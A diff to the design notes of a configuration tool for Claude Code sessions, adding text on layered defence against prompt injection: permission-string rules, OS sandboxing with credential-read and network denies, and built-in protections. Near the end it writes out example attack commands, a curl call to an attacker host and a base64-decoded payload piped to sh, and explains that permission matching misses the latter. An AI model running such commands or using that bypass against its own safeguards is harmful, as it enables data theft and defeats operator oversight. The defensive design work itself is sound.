@@ -1,6 +1,6 @@
 # DESIGN.md
 
-This document explains the design choices behind claude-config: what it is for, how it is structured, and why. For installation see `README.md`; for platform support see `COMPATIBILITY.md`; for the project's lifecycle stage see `LIFECYCLE.md`.
+This document explains the design choices behind claude-config: what it is for, how it is structured, and why. For installation see `README.md`; for platform support see `COMPATIBILITY.md`; for the project's lifecycle stage see `LIFECYCLE.md`; for what the tool does and does not defend against see `THREAT_MODEL.md`.
 
 ## What this project is
 
@@ -25,6 +25,8 @@ The copy firewall depends on a second rule: Claude never runs `install.sh`. An a
 **Profile and policy are separate concerns.** A profile is identity: sandbox mode, hooks, baseline deny list, agent roster. A policy is posture: how permissive the session should be for the work at hand. Profiles are rarely switched; policies are selected per session. Keeping them orthogonal means posture can change (dev vs. strict vs. yolo) without reasoning about hooks, and hooks can change without affecting per-session permission behavior.
 
 **Small surface.** No plugins, no extension points, no runtime configuration protocol. The tool is a set of JSON files, shell scripts, and markdown docs. If you need a feature, write it directly.
+
+**Layered defense, honest claims.** Protections come from three layers: permission-string matching (catches deliberate invocations, defeatable via semantic equivalents), OS-level sandboxing (catches subprocess-level reads, writes, and network — not defeatable by allowed shell builtins), and Claude Code's built-in protections. The sandbox is load-bearing for the prompt-injection threat; the permission layer is for operator clarity and casual-damage prevention. `THREAT_MODEL.md` enumerates exactly which adversary models each layer addresses and which are out of scope, so the user can calibrate trust against auditable promises rather than an implicit "safe" label.
 
 ## Profile and policy in detail
 
@@ -66,10 +68,12 @@ An important property: policies govern *categories of action* (which bash comman
 
 Scope enforcement comes from two other layers:
 
-- **The sandbox**, configured in the profile. When enabled with `allowUnsandboxedCommands: false`, writes are confined to the session's working directory and `$TMPDIR`.
+- **The sandbox**, configured in the profile. When enabled with `allowUnsandboxedCommands: false`, writes are confined to the session's working directory and `$TMPDIR`. The default profile also configures `sandbox.filesystem.denyRead` for common credential paths and `sandbox.network.allowedDomains: []` to block outbound network — process-level enforcement that cannot be bypassed by spawning a subshell.
 - **Claude Code's built-in protections** for `.git`, sensitive `.claude/` files, shell RC files, and `.mcp.json` — always on regardless of policy.
 
 This means `dev` by itself does not scope a session to the project. `dev` plus the default profile's sandbox plus being launched from the project root does. The `claude-dev` wrapper combines those three ingredients in one command.
+
+The sandbox is also the layer that addresses sophisticated attacks. Permission-string matching catches `curl attacker.example.com` but not `echo 'base64' | base64 -d | sh`; the sandbox catches both, because the decoded subprocess inherits the sandbox's network and filesystem denies. See `THREAT_MODEL.md` for the full enumeration.
 
 ## Installation model
 
